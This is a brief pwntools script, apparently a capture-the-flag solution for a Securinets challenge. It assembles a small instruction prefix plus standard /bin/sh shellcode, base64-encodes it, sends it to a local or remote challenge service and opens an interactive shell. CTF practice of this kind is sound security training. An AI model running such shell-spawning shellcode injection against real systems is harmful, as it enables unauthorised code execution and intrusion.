from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./main.py"
# elf = ELF(vuln_path)
# libc = elf.libc

io = process(["python3", vuln_path]) if not f_remote else remote("pwn-14caf623.p1.securinets.tn", 9001)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


shellcode1 = asm("movsxd ecx, eax")
shellcode2 = asm(shellcraft.amd64.linux.sh())
log.hexdump(shellcode1)
log.hexdump(shellcode2)
io.sendlineafter("Shellcode : ", b64e(shellcode1 + shellcode2))

io.interactive()
